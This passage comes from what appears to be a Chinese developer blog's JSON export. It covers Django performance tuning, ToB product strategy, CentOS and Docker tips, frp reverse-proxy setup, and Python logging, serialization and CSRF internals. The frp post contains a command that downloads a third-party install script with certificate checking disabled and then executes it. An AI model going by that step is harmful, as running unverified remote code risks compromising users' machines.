技术主要优势：\n访问速度更快\n用户连接的是距离最近的 CDN 服务器，来获得内容，在访问速度上会得到显著提升。\n可用性\n在用户流量过高、间歇性高峰和潜在服务器故障等高压力情况下，CDN 依然能保障用户能获取到内容。\n安全性\nCDN 服务能够有效缓解各种攻击行为。\n将前端静态文件托管到 CDN ，是对前端优化很重要的一个环节。当然，这种改造需要部署系统支持。\n3.3 根据页面拆分前端静态文件 拆分前端打包的静态文件，是为了用户访问应用时，按需加载。而不必在首次加载页面时，请求全部文件。前端使用的是 webpack 3.6.0，在 webpackConfig 的 plugins 属性中新增如下内容即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 new webpack.optimize.ModuleConcatenationPlugin(), new webpack.optimize.CommonsChunkPlugin({ name: \u0026#39;vendors\u0026#39;, minChunks (module) { return ( module.resource \u0026amp;\u0026amp; /\\.js$/.test(module.resource) \u0026amp;\u0026amp; module.resource.indexOf( path.join(__dirname, \u0026#39;../node_modules\u0026#39;) ) === 0 ) } }), new webpack.optimize.CommonsChunkPlugin({ name: \u0026#39;manifest\u0026#39;, minChunks: Infinity }), new webpack.optimize.CommonsChunkPlugin({ name: \u0026#39;app\u0026#39;, async: \u0026#39;vendor-async\u0026#39;, children: true, minChunks: 3 }) 3.4 减少不必要的接口调用 由于前端开发人员不稳定，交接频繁，实现逻辑上存在不一致。同时，前端代码质量参差不齐，代码实现上不易于扩展和维护。主要存在以下情况：\n在公共模块中已经调用的接口，路由子页面中重复调用 只属于某一个路由子页面的接口，每个页面都在调用 页面中同一接口，调用多次 这部分主要需要前端开发 Review 代码，在代码逻辑层进行优化。\n4. 后端 本节分为两个部分，前面介绍几种性能分析工具，在分析数据的基础上，后半节主要介绍如何进行优化。\n4.1 django-debug-toolbar 分析时间消耗 django-debug-toolbar 是一个不错的 Django 性能检测工具。django-debug-toolbar 主要提供以下几个方面的性能检测：\n执行了多少条 SQL 语句 有多少时间花费在数据库上 执行了什么特殊的查询操作，每次查询花费多长时间 这些查询是有什么代码生成的 渲染页面都用到了哪些模板 冷/热缓存是如果影响性能的 安装 1 pip install django-debug-toolbar 配置 1 2 3 4 5 6 7 8 9 10 11 INSTALLED_APPS = [ # ... \u0026#39;django.contrib.staticfiles\u0026#39;, # ... \u0026#39;debug_toolbar\u0026#39;, ] MIDDLEWARE = [ # ... \u0026#39;debug_toolbar.middleware.DebugToolbarMiddleware\u0026#39;, # ... ] url.py\n1 2 3 4 5 6 7 8 from django.conf import settings from django.conf.urls import include, url if settings.DEBUG: import debug_toolbar urlpatterns = [ url(r\u0026#39;^__debug__/\u0026#39;, include(debug_toolbar.urls)), ] + urlpatterns 配置成功之后，就可以看到相关性能的检查数据：\n4.2 django-debug-panel 分析 Ajax django-debug-panel 在 django-debug-toolbar 的基础上，提供了更好地对单页面应用和 Ajax 请求的支持。\n安装 1 pip install django-debug-panel 配置 settings.py\n1 2 3 4 INSTALLED_APPS = ( # ... \u0026#39;debug_panel\u0026#39;, ) 使用 panel 的中间件，替换 toolbar 的中间件。\nmiddlewares.py\n1 2 3 4 5 6 MIDDLEWARE_CLASSES = ( ... # \u0026#39;debug_toolbar.middleware.DebugToolbarMiddleware\u0026#39;, \u0026#39;debug_panel.middleware.DebugPanelMiddleware\u0026#39;, ... ) 安装 Chrome 扩展：Django Debug Panel\n配置成功之后，就可以看到相关性能的检查数据：\n4.3 django-debug-toolbar-requests 分析 requests 请求 通常，我们会使用 requests 库，请求一些第三方的接口。这些第三方接口的性能也需要被关注。django-debug-toolbar-requests 在 django-debug-toolbar 的基础上，提供了对 requests 请求的支持。\n安装 1 pip install django-debug-toolbar-requests 配置 1 2 3 4 INSTALLED_APPS =（ # ... \u0026#39;requests_toolbar\u0026#39;， ） 在 DEBUG_TOOLBAR_PANELS 中添加 RequestsDebugPanel\n1 2 3 4 DEBUG_TOOLBAR_PANELS = ( # ... \u0026#39;requests_toolbar.panels.RequestsDebugPanel\u0026#39;, ) 配置成功之后，就可以看到相关性能的检查数据：\n4.4 Django 数据库优化 给搜索频率高的字段加索引 在 Django 中定义 Model 时，可以通过 db_index=True 给字段添加索引：\n1 2 3 class Country(models.Model): name = models.CharField(unique=True, db_index=True, max_length=50) short_name = models.CharField(unique=True, max_length=5) 给关键的字段添加索引，性能会得到很大提升，特别是数据量大、查询操作多时。可以参考这篇文档\n但是索引并不是越多越好，索引可以极大的提高数据的查询速度，但是会降低插入、删除、更新表的速度。把握合适的度很重要。\n合理利用 QuerySets 缓存 Django 的 QuerySets 有缓存，一旦取出来，会在内存呆上一段时间。看下面的这个例子：\n1 2 3 entry = Entry.objects.get(id=1) entry.blog # Blog object is retrieved at this point entry.blog # cached version, no DB access 1 2 3 entry = Entry.objects.get(id=1) entry.authors.all() # query performed entry.authors.all() # query performed again all、count、exists 等函数调用才需要连接数据库，但是属性访问不需要连接数据库。如果是自定义的属性，需要使用 cached_property，添加缓存策略，可以参考这篇文档。\n利用 iterator() 获取对象，避免 QuerySets 内存消耗 1 2 3 allbooks = Book.objects.filter(author = \u0026#39;chenshaowen\u0026#39;) for book in allbooks.iterator(): do_something(book) QuerySet 会在缓存其结果，以便在重复计算时不会导致额外的查询。而 iterator() 将直接读取结果，不在 QuerySet 级别执行任何缓存。对于返回大量只需要访问一次的对象的 QuerySet，这可以带来更好的性能，显著减少内存使用。\n尽量批量操作 批量操作能有效减少数据库连接的次数。\n批量插入数据\n1 2 3 4 product_list_to_insert = list() for x in range(10): product_list_to_insert.append(Product(name=\u0026#39;product name \u0026#39; + str(x), price=x)) Product.objects.bulk_create(product_list_to_insert) 批量更新数据\n1 Product.objects.filter(name__contains=\u0026#39;name\u0026#39;).update(name=\u0026#39;new name\u0026#39;) 批量删除数据\n1 Product.objects.filter(name__contains=\u0026#39;name query\u0026#39;).delete() 多对多关系\n1 my_band.members.add(me, my_friend) 4.5 合理利用缓存 缓存是优化性能的利器。缓存的思路是利用空间交换时间，避免重复计算。\n在 Django 中常用的缓存方式有：\n开发调试缓存 内存缓存 文件缓存 数据库缓存 Memcache缓存(使用python-memcached模块) Memcache缓存(使用pylibmc模块) 根据不同粒度，又可以将缓存划分得更细：\n整站缓存 只需要添加中间件即可：\n1 2 3 4 5 ... += [ \u0026#39;django.middleware.cache.UpdateCacheMiddleware\u0026#39;, \u0026#39;django.middleware.common.CommonMiddleware\u0026#39;, \u0026#39;django.middleware.cache.FetchFromCacheMiddleware\u0026#39;, ] 视图层缓存 1 2 3 4 5 from django.views.decorators.cache import cache_page @cache_page(60 * 15) def my_view(request): pass 模板片段缓存 1 2 3 4 {% load cache %} {% cache 500 sidebar %} .. sidebar .. {% endcache %} 定制缓存 Django 提供的 django.core.cache.caches 允许用户，自行设置、维护缓存。\n1 2 3 4 5 \u0026gt;\u0026gt;\u0026gt; from django.core.cache import caches \u0026gt;\u0026gt;\u0026gt; cache1 = caches[\u0026#39;myalias\u0026#39;] \u0026gt;\u0026gt;\u0026gt; cache2 = caches[\u0026#39;myalias\u0026#39;] \u0026gt;\u0026gt;\u0026gt; cache1 is cache2 True 线程中的缓存 除了 Django 内置的缓存机制，利用 Python 的动态特性，在线程级别还可以进行更细粒度的缓存：\n1 2 3 4 5 6 7 8 9 def get_value(self,cache_key,default=None): value=getattr(local,cache_key,None) if value: return value value=cache.get(cache_key,default=None) if value is None: return default setattr(local,cache_key,value) return value 将数据缓存在当前线程 local 中，这种优化方式对在一个请求内多次访问相同缓存的场景有比较好的效果。\n实际上这是在使用内存缓存。\n4.4 代码逻辑优化 正则表达式记得编译 1 re.compile(…) 排序尽量使用 .sort()\nO(nlogn) 使用 key 比 cmp 效率更高 使用列表迭代表达式\n1 2 3 4 5 6 def function1(l): result = [] for i in l: if i % 2 == 0: result.append(i) return result 使用列表推导比上面快了 36%\n1 2 def function2(l): return [i for i in l if i % 2 == 0] 减少函数调用，尽量访问局部变量 1 2 3 4 5 6 7 8 def add_two(i): return i + 2 def function1(l): result = [] for item in l: result.append(chr(add_two(item))) return result 减少函数调用之后比上面快了 40%\n1 2 3 4 5 6 def function2(l): result = [] lchr = chr for item in l: result.append(lchr(item + 1)) return result 使用 set 判断元素是否存在 1 2 3 4 l = range(10000) def function1(): return 9000 in l 使用 set 之后比上面快了 70000%\n1 2 3 4 s = set(range(10000)) def function2(item): return item in s ","description":"","id":410,"section":"post","tags":["博文","Django","优化","前端","后端","指南"],"title":"Django 全栈优化指南","uri":"https://www.chenshaowen.com/blog/django-full-stack-optimization-guide.html"},{"content":" 本人所在的团队正在打造一款 ToB 产品，在垂直领域颇有影响力。此文是对团队关键事件的梳理，同时也包含了一些个人思考。\n1. 在熟悉的场景中做到最好 互联网上，粗制滥造的内容太多，能获得广泛关注和影响力的产品屈指可数。\n只有基于对用户痛点的深入了解，才能够提出优秀的解决方案。而这些痛点就在身边，在我们最熟悉的环境里。每一次大团队面临的困境和挑战，都是小团队和个人的机遇。其实这就是一个成长上位的过程，有了这样的竞争机制，社会才会得到发展。\n在熟悉的场景中做到最好，就是要解决好当下团队遇到的问题。这种问题是各种各样的，比如，投诉多，团队忙于应付，费时费力不讨好。投诉是领导不愿意看到的，关键是还多。\n这种领导关注、也很棘手的问题，如果能解决得很好，一定可以给你增添很多信用，赢得更多时间。\n2. 引入新的概念，打造全新产品 破局者通常会是外来者。\n打败淘宝的肯定不是淘宝，打败微信的肯定不是微信。领域概念一旦进入人的心智将难以改变。\n反过来想，遇到问题、面临挑战必然也是因为，原来设计的内部机制不能够满足现有的业务需求。仅依靠内部革新是没有足够的动力推进的。在变革的过程中，大量的既得利益者会成为阻碍，根本就没有时间和机会打磨产品。\n引入新的概念，需要一定的技术眼光。新的概念需要将现有技术容纳在内，如果没有现成的概念，那么就需要自己造一个。Docker 就是一个很好的例子，虚拟化、容器化技术已经发展几十年，但直到遇到 Docker 才开始火爆起来。Docker 技术实际上吸收和容纳了大量已有的技术，在此基础进行整合。\n变革就是这样，前奏已经唱响很久，等待的只是最后冲锋的号角。\n引入新的概念，利用其他团队对新概念不够熟悉的窗口期，快速打造产品，满足业务的需求。打造有价值密度的产品很关键，如果只是新瓶装旧酒，那就没有太大意义。\n3. 更通用化，让更多的人参与进来 互联网的内涵是分享，信息不断地穿梭于各个节点。节点流量的大小和质量决定了自身在网络中的价值。产品服务人群的大小和质量，同样也决定着这个产品的价值。能被更多团队更多人使用当然会是更好的，但做起来却十分不易。\n可能本就没打算将产品做得这么大，现在却需要适配各种场景。初心并不重要，重要的是已经出发在路上，并且能不断地调整目标、逐步优化。\n这将会是一个长期经营的过程，需要去团结更多的人，让更多人的利益绑定到产品上。很多项目就是在这个过程中逐步被边缘化，统一不了内部，也打不出去。当领导层发生变动时，整个产品可能就被遗弃。\n下面是我所在的团队做得很棒的地方，涉及的事项与产品特性相关，不一定能直接复制。\n3.1. 学校社团合作 学校社团有了解生产技术的需求，希望能与企业建立联系，增加毕业时的竞争力。在校园阶段给学生埋下种子，是一件性价比极高的事。学生可以作为企业招聘的生源，而且是可持续、批量的生源。即使学生未来没有进入产品企业，在其他企业同样也会发挥巨大作用。\n在其他企业埋下的这颗种子，当问题场景出现时，他将会主动推广产品。\n3.2 培训入职毕业生 毕业生，没有太多历史包袱，学习能力强、可塑性强，是挖掘之地。\n大型企业每年会招聘大量毕业生，这些毕业生会被分配到各个地方。对这些毕业生进行培训，并将产品植入其心智。培训他们，教他们使用、教他们开发，与他们建立联系。\n相较于学校社团合作，培训新人效果更佳。这是在搭建内部营销网络，这些种子会帮助推广、也会长大上位获得决策权，统一内部，让大家达成一致只是一个时间问题。\n3.3 支持内部高曝光系统 技术人员的毛病就是谁也不服谁，重新造轮子又不是什么难事。\n宣传产品，需要一定的曝光度。如果都不曾被记起，就更谈不上接入使用产品了。而企业内部的办公行政系统，具有超高访问量，是一个不错的宣传入口。\n同时，办公行政作为成本部门，开发人员、预算各种缺乏，如果你愿意伸以援手，他们一定会感激不尽。\n3.4 开源 2008 年 4 月份 GitHub 正式上线，截止 2018 年 11 月，仓库数量突破了 1 亿，一共汇集了来自全球的 3100 万开发者。\n开源运动改变了整个软件研发体系。大量的开源软件在各个企业被应用，大家有了相同的基础，一起开发、使用、维护。越来越多的人聚集在一起，群策群力完成一个项目。\n开源聚拢了开发者和用户。更多的人参与就意味着产品被部署实施的可能性越大。\n4. 发展服务商 做 ToB 需要两样东西，关系和产品。\n企业使用新产品是有风险的，出了问题找谁，售后靠不靠得住，这都是问题。而关系这种玄妙的中国特产，可以解决这个问题。\n另外一个就是产品。做 IT 服务，总得有几个能上台面的产品，不然就真的成了现场部署，一锤子买卖，不能持续提供后续的增值服务。\n服务商有产品的需求，而产品也有向外推广的需求，十分契合。同时，随着用户群体地不断增加，服务商的数量也是可以扩充的，而不至于让自己直接面对越来越多的客户。\n5. 增强产品信用 有了服务商的推广实施案例，网络上大量转发的文章，产品就已经收获了一定影响力。但这时，其他人可能已经嗅到了机会，同类竞品市面上也出现了不少。\n为了击退、孤立这些竞争者，除了产品侧更加努力外，还可以联合更上一层的利益团体。因为产品肯定是定位于某一个细分的领域，这样就必然能够找到更上一层的组织、政府机构。他们也有自己的诉求，规范行业标准。借助这样的机会，就可以将产品上升到行业标杆的高度。\n如果能落地一两个标准就更好了。这样服务商在提方案是也会底气十足，校园洽谈时也能占据主动。这是对产品最好的背书。\n","description":"","id":411,"section":"post","tags":["博文","思考","社区"],"title":"企业如何打造 ToB 产品","uri":"https://www.chenshaowen.com/blog/how-to-build-tob-products.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. WhiteNoise 转发静态文件 Django 内置的静态文件服务器效率很低，而 WhiteNoise 是一个不错的替代品。具有如下特点：\n通常用于 PaaS 服务 支持 wsgi 应用程序，针对 Django 进行了特殊适配 配合 CDN 使用，更佳 在 Gunicorn 配合下，使用 sendfile 系统调用，处理效率非常高 相比于 Nginx，WhiteNoise 提供静态文件服务的方式更加简单，但效率只有 Nginx 的 15％ 2. 记录 Django 模型修改历史 django-simple-history\n原理：每个需要追踪的模型都需要单独创建一张表，修改实例时，在表中直接新建一条记录。\ndjango-reversion\n原理：当模型数据发生修改时，将修改序列化到 Version 表中。仅需要一张表，就可以记录全部修改记录。\n3. CentOS 升级 Docker 版本 卸载旧版本的Docker 1 2 3 4 5 6 $yum remove docker \\ docker-common \\ container-selinux \\ docker-selinux \\ docker-engine \\ docker-engine-selinux 保存在 /var/lib/docker/ 的镜像、容器、数据、网络都会被保留。\n安装依赖 1 yum install -y yum-utils device-mapper-persistent-data lvm2 安装 Docker 1 2 3 yum-config-manager \\ --add-repo \\ https://download.docker.com/linux/centos/docker-ce.repo 1 yum makecache fast 1 yum install docker-ce 4. 远程控制工具 - TeamViewer 由于，目前（2018.11）Mac OS X 的 QQ 不支持远程协助。推荐另外一个远程控制软件：\nTeamViewer 兼容于 Microsoft Windows、Mac OS X、Linux、iOS、Android 操作系统，也可以通过网页浏览器连线已安装 TeamViewer 的计算机。\n5. Linux 新增交换分区文件 查看当前分区情况\n1 free -m 增加 swap 大小，2G 左右\n1 dd if=/dev/zero of=/var/swap bs=1024 count=2048000 设置交换文件\n1 mkswap /var/swap 立即激活启用交换分区\n1 swapon /var/swap 添加系统引导时自启动运行\n1 vi /etc/fstab 添加一行\n1 /var/swap swap swap defaults 0 0 至此，CentOS 增加 Swap 分区大小，完成。\n收回 swap 空间\n1 swapoff /var/swap 从文件系统中回收\n1 rm /var/swap 6. CentOS 7 安装 minikube 新增安装源：\n1 2 3 4 5 6 7 8 9 cat \u0026lt;\u0026lt;\u0026#39;EOF\u0026#39; \u0026gt; /etc/yum.repos.d/kubernetes.repo [kubernetes] name=Kubernetes baseurl=https://packages.cloud.google.com/yum/repos/kubernetes-el7-$basearch enabled=1 gpgcheck=1 repo_gpgcheck=1 gpgkey=https://packages.cloud.google.com/yum/doc/yum-key.gpg https://packages.cloud.google.com/yum/doc/rpm-package-key.gpg EOF 开始安装：\n1 2 3 4 yum -y install kubectl wget https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 -O minikube chmod +x minikube mv minikube /usr/local/bin/ Linux 下 minikube 支持两种虚拟机 VirtualBox 和 KVM。但如果，你使用的是云服务器，无法开启 CPU 的虚拟化功能，可以使用使用宿主机的 Docker 环境。\n1 minikube start --vm-driver=none 参考文章。\n7. CentOS 7 安装指定版本的 Docker 新增 Aliyun 的 docker-ce 源\n1 2 yum install -y yum-utils yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 查看可选的 docker-ce 版本\n1 2 3 4 5 6 yum list docker-ce --showduplicates docker-ce.x86_64 17.03.3.ce-1.el7 docker-ce-stable docker-ce.x86_64 18.06.3.ce-3.el7 docker-ce-stable docker-ce.x86_64 3:18.09.9-3.el7 docker-ce-stable docker-ce.x86_64 3:19.03.8-3.el7 docker-ce-stable 安装指定版本的 docker-ce\n1 yum install -y docker-ce-19.03.8-3.el7 启动\n1 2 systemctl start docker systemctl enable docker ","description":"","id":412,"section":"post","tags":["博文","Tips","文件","Django","CentOS","Docker"],"title":"开发 Tips（4）","uri":"https://www.chenshaowen.com/blog/developing-tips-4.html"},{"content":"1. 什么是 frp frp 是一个高性能的反向代理应用，提供的功能有：\n利用处于内网或防火墙后的机器，对外网环境提供 http 或 https 服务 对于 http、https 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个 80 端口 利用处于内网或防火墙后的机器，对外网环境提供 tcp 和 udp 服务，例如在家里通过 ssh 访问处于公司内网环境内的主机 2. 架构和部署 frp 采用的是 C/S 架构。在使用时，需要：\n部署服务端，将 frps 及 frps.ini 放到具有公网 IP 的机器上，运行 frps；\n部署客户端，将 frpc 及 frpc.ini 放到处于内网环境的机器上，运行 frpc。\nfrp 是采用 Go 语言写的，支持 OS X、Windows、Linux 操作系统。\n3. 服务器端安装 frp 服务器端安装 frp，有两种方法。\nGitHub 下载 Releases 版本，手动安装 使用 clangcn 写的 脚本 安装 下面步骤采用的是使用脚本安装：\n下载脚本 1 wget --no-check-certificate https://raw.githubusercontent.com/clangcn/onekey-install-shell/master/frps/install-frps.sh -O ./install-frps.sh 增加执行权限 1 chmod +x install-frps.sh 执行安装 1 ./install-frps.sh install 安装的过程中，需要填入一些配置参数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 Please input frps bind_port [1-65535](Default Server Port: 5443): 输入frp提供服务的端口，用于服务器端和客户端通信，按Enter键表示默认5443，否则手动输入新端口 Please input frps dashboard_port [1-65535](Default dashboard_port: 6443): 输入frp的控制台服务端口，用于查看frp工作状态，按Enter键表示默认6443，否则手动输入新端口 Please input frps vhost_http_port [1-65535](Default vhost_http_port: 80): 输入frp进行http穿透的http服务端口，按Enter键表示默认80，否则手动输入新端口，一般不建议默认80 Please input frps vhost_https_port [1-65535](Default vhost_https_port: 443): 输入frp进行https穿透的https服务端口，按Enter键表示默认443，否则手动输入新端口 Please input privilege_token (Default: XXXXXXXXXXXXXXXXX): 输入frp服务器和客户端通信的密码，默认是随机生成的，按Enter键表示按默认来，否则手动输入。frpc客户端需要这个接头暗号 Please input frps max_pool_count [1-200](Default max_pool_count: 50): 设置每个代理可以创建的连接池上限，默认50 Please select log_level ##### 1: info 2: warn 3: error 4: debug Enter your choice (1, 2, 3, 4 or exit. default [1]): 设置日志等级，4个选项，默认是info Please input frps log_max_days [1-30] (Default log_max_days: 3 day): 设置日志保留天数，范围是1到30天，默认保留3天。 ##### Please select log_file ##### 1: enable 2: disable Enter your choice (1, 2 or exit. default [1]): 设置是否开启日志记录，默认开启，开启后日志等级及保留天数生效，否则等级和保留天数无效 4. 客户端配置 在 frp 的 releases 页面，可以找到适合 Windows 系统的软件包。下载之后，编辑配置文件 frpc.ini ：\n1 2 3 4 5 6 7 8 9 [common] server_addr = 111.222.333.444 server_port = 5443 token = XXXXXXXX [web] type = http local_port = 8000 custom_domains = xxx.chenshaowen.com 参数说明：\nserver_addr，服务器端的 IP 地址 server_port，服务器端绑定的端口 token，frp 服务的 token 本地启的是 Django 工程，服务绑定在 8000 端口。\n同时在 DNS 上，需要将 xxx.chenshaowen.com 指向 111.222.333.444 （frp 服务器端的地址）\n运行本地客户端：\n1 ./frpc -c ./frpc.ini 至此，就可以直接使用公网域名访问本地服务了：\n5. 路由器配置 在 KoolShare 软件中心，安装【虚拟内存】和【frpc穿透】插件。\n配置服务器端信息（使用脚本安装 frp 服务器端成功之后，会打印完整的配置信息）\n配置端口映射，将外网的访问转发到指定的内网端口：\n最后别忘了，将【域名配置/SK】中的域名解析到 frp 服务器地址。\n6. 参考 https://github.com/fatedier/frp/blob/master/README_zh.md ","description":"","id":413,"section":"post","tags":["博文","FRP","Demo","工具"],"title":"使用 frp 将本地服务发布到公网","uri":"https://www.chenshaowen.com/blog/using-frp-to-publish-local-service-to-public-network.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. Python 的日志模块 Python 的 logging 模块主要由四个部分组成：\nLoggers: 可供程序直接调用的接口 Handlers: 将日志记录输出至合适的位置 Filters: 提供更细粒度的日志是否输出判断 Formatters: 定制最终记录打印的布局格式 看下面这个例子，log1.py 文件\n1 2 3 4 5 6 7 8 import logging logging.basicConfig(level=logging.INFO, format=\u0026#39;%(asctime)s - %(name)s - %(levelname)s - %(message)s\u0026#39;) logger = logging.getLogger(__name__) logger.info(\u0026#39;info log\u0026#39;) logger.debug(\u0026#39;debug log\u0026#39;) logger.warning(\u0026#39;Warning log\u0026#39;) 直接执行，输出：\n1 2 2018-10-26 21:08:02,905 - __main__ - INFO - info log 2018-10-26 21:08:02,907 - __main__ - WARNING - Warning log log2 文件\n1 from log1 import logger 直接执行，输出：\n1 2 2018-10-26 21:11:36,849 - log1 - INFO - info log 2018-10-26 21:11:36,849 - log1 - WARNING - Warning log format 部分参数：\n%(levelno)s：打印日志级别的数值 %(levelname)s：打印日志级别的名称 %(pathname)s：打印当前执行程序的路径，其实就是 sys.argv[0] %(filename)s：打印当前执行程序名 %(funcName)s：打印日志的当前函数 %(lineno)d：打印日志的当前行号 %(asctime)s：打印日志的时间 %(thread)d：打印线程 ID %(threadName)s：打印线程名称 %(process)d：打印进程 ID %(processName)s：打印线程名称 %(module)s：打印模块名称 %(message)s：打印日志信息 2. Python 的调试工具 pdb The Python Debugger 是官方调试器，内置在 Python 标准模块中。\n使用方式：$python -m pdb scriptfile 或者在代码中 pdb.set_trace()\nipdb 基于 ipython 的 pdb，是一个增强版的 pdb。\n使用方式：$ipdb scriptfile 或 $python –pdb scriptfile\nPuDB 全屏的基于控制台的可视化调试器。\n使用方式：$python -m pudb.run scriptfile 或 $pudb scriptfile\n3. Babel 转码器 ES6 提供了许多新特性，但并不是所有的浏览器都能够完美支持，ES5 支持得好很多。Babel 是一个 ES6 转码器，可以将 ES6 代码转为 ES5 代码。这意味着，你可以用 ES6 的语法编写程序，又不用担心现有环境是否支持。\n1 2 3 4 5 6 7 // 转码前 input.map(item =\u0026gt; item + 1); // 转码后 input.map(function (item) { return item + 1; }); Babel 的配置文件是 .babelrc ，存放在项目的根目录下。使用该文件设置转码规则和插件，基本格式如下：\n1 2 3 4 { \u0026#34;presets\u0026#34;: [], \u0026#34;plugins\u0026#34;: [] } 4. Badge 生成器 开源项目的文档中，通常会添加各种 Badge 。这些 Badge 有的是写死的，有的是第三方工具动态获取的。推荐 http://shields.io/ 可以非常方便的生成各种 Badge 。\n5. 代码统计工具 - Cloc Cloc 是一款使用 Perl 语言开发的开源代码统计工具，支持多平台、多语言，能够计算指定目标文件或文件夹中的文件数（files）、空白行数（blank）、注释行数（comment）和代码行数（code）。\nWindows 下，可以先下载安装 msys2，使用 $pacman -S cloc 安装 Cloc，然后统计:\n1 2 3 4 5 6 7 8 9 10 11 12 cloc . -------------------------------------------------------------------------------- Language files blank comment code -------------------------------------------------------------------------------- Python 523 10217 13308 61964 JSON 24 22 0 33329 HTML 267 2994 752 29736 XML 3 0 0 21113 ... -------------------------------------------------------------------------------- SUM: 2157 142804 147553 912384 -------------------------------------------------------------------------------- 6. Django Model 的更新信号处理 通过 created 字段，可以区分 Django Model 的新建和更新操作。\n1 2 3 4 5 6 7 8 9 10 11 from django.db.models.signals import post_save @receiver(post_save, sender=User) def handle_when_user_updated(sender, instance, created, **kwargs): if not created: # User object updated pass else: # User object created pass ","description":"","id":414,"section":"post","tags":["博文","Tips","Python","编码"],"title":"开发 Tips（3）","uri":"https://www.chenshaowen.com/blog/developing-tips-3.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. Python 中的序列化与反序列化 序列化，将内存对象转化为可存储或传输序列的过程。反序列化，把序列化序列重新转化为内存对象的过程。Json 和 Pickle 是 Python 中常用的两个序列化处理模块。\nJson VS Pickle:\nJson 实现的是内存对象与 Json 字符串的转换，Pickle 实现的是内存对象与字节对象的转换 Json 格式广泛应用于除 Python 外的其他领域，Pickle 是 Python 独有的 Json 只能序列化 Python 内置的基本数据类型对象，Pickle 可以序列化一切对象，包括函数 cPickle 是 Pickle 的 C 语言实现，常用来替换 Pickle 以提升性能 使用示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # -*- coding: utf-8 -*- import json import pickle obj = {\u0026#39;a\u0026#39;: \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;: \u0026#39;d\u0026#39;} ps = pickle.dumps(obj) print ps # \u0026#34;(dp0\\nS\u0026#39;a\u0026#39;\\np1\\nS\u0026#39;b\u0026#39;\\np2\\nsS\u0026#39;c\u0026#39;\\np3\\nS\u0026#39;d\u0026#39;\\np4\\ns.\u0026#34; js = json.dumps(obj) print js # {\u0026#34;a\u0026#34;: \u0026#34;b\u0026#34;, \u0026#34;c\u0026#34;: \u0026#34;d\u0026#34;} print pickle.loads(ps) # {\u0026#39;a\u0026#39;: \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;: \u0026#39;d\u0026#39;} print json.loads(js) # {u\u0026#39;a\u0026#39;: u\u0026#39;b\u0026#39;, u\u0026#39;c\u0026#39;: u\u0026#39;d\u0026#39;} 除此之外，对字符串还可以进行压缩，以节省存储：\n1 2 3 4 5 6 7 8 import cPickle as pickle import zlib # 序列化，并压缩 compressed = zlib.compress(pickle.dumps(obj)) # 解压缩，反序列化 obj = pickle.loads(zlib.decompress(compressed)) 2. Django CSRF django.middleware.csrf.CsrfViewMiddleware 处理逻辑:\n进入 views 函数处理之前，如果 cookies 里面有 csrf token，则将其设置在 request.Meta 中，否则生成一个 token。如果不是 GET、HEAD 等方法则，校验 CSRF。\n校验规则：从 Cookie 中取出 csrf token 与 POST 请求中的 csrfmiddlewaretoken 或者 HTTP_X_CSRFTOKEN 进行比较。如果两者相等，则通过校验，否则返回 403。\n在返回响应之前，如果设置过 CSRF_COOKIE_USED，则会将 csrf token 设置到 Cookie 中。通常有两种方式设置 CSRF_COOKIE_USED：\n直接使用 django.middleware.csrf.get_token 函数获取 csrf token 配置 django.template.context_processors.csrf 上下文处理器，在模板里面渲染 csrf token，实际上还是调用了 get_token 函数 下面是摘取的部分 Django 源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 class CsrfViewMiddleware(object): def process_view(self, request, callback, callback_args, callback_kwargs): try: csrf_token = _sanitize_token( request.COOKIES[settings.CSRF_COOKIE_NAME]) request.META[\u0026#39;CSRF_COOKIE\u0026#39;] = csrf_token except KeyError: request.META[\u0026#34;CSRF_COOKIE\u0026#34;] = _get_new_csrf_key() if request.method == \u0026#34;POST\u0026#34;: request_csrf_token = request.POST.get(\u0026#39;csrfmiddlewaretoken\u0026#39;, \u0026#39;\u0026#39;) if request_csrf_token == \u0026#34;\u0026#34;: request_csrf_token = request.META.get(\u0026#39;HTTP_X_CSRFTOKEN\u0026#39;, \u0026#39;\u0026#39;) if not constant_time_compare(request_csrf_token, csrf_token): return self._reject(request, REASON_BAD_TOKEN) def process_response(self, request, response): if request.META.get(\u0026#34;CSRF_COOKIE\u0026#34;) is None: return response if not request.META.get(\u0026#34;CSRF_COOKIE_USED\u0026#34;, False): return response response.set_cookie(settings.CSRF_COOKIE_NAME, request.META[\u0026#34;CSRF_COOKIE\u0026#34;], max_age=settings.CSRF_COOKIE_AGE, domain=settings.CSRF_COOKIE_DOMAIN, path=settings.CSRF_COOKIE_PATH, secure=settings.CSRF_COOKIE_SECURE, httponly=settings.CSRF_COOKIE_HTTPONLY ) return response 参数解释：\nmax_age: cookie的生命长度，默认为None，浏览器关闭 cookie 立即失效 expires: cookie 过期时间时间点，默认为None，浏览器关闭 cookie 立即失效 path: Cookie 生效的路径，/ 表示根路径，根路径的cookie可以被任何url的页面访问 domain: 默认值为 None，设置该 Cookie 的网页所在的域名None secure: 用来设置 Cookie 只在确保安全的请求中才会发送。当请求是 HTTPS 或者其他安全协议时，包含 secure 选项的 Cookie 才能被保存到浏览器或者发送至服务器。 httponly: 只能 http 协议传输，无法被 JavaScript 获取（不是绝对，底层抓包可以获取到也可以被覆盖）默认值 False。 Django 中关于 CSRF 的默认配置：\n1 2 3 4 5 6 7 # Settings for CSRF cookie. CSRF_COOKIE_NAME = \u0026#39;csrftoken\u0026#39; CSRF_COOKIE_AGE = 60 * 60 * 24 * 7 * 52 CSRF_COOKIE_DOMAIN = None CSRF_COOKIE_PATH = \u0026#39;/\u0026#39; CSRF_COOKIE_SECURE = False CSRF_COOKIE_HTTPONLY = False 3. djcelery_crontabschedule already exists 错误 使用版本：\nDjango==1.8.3 celery==3.1.18 django-celery==3.1.16 升级 django-celery==3.2.2 时，执行 python manage.py migrate，报错：\n1 2 3 File 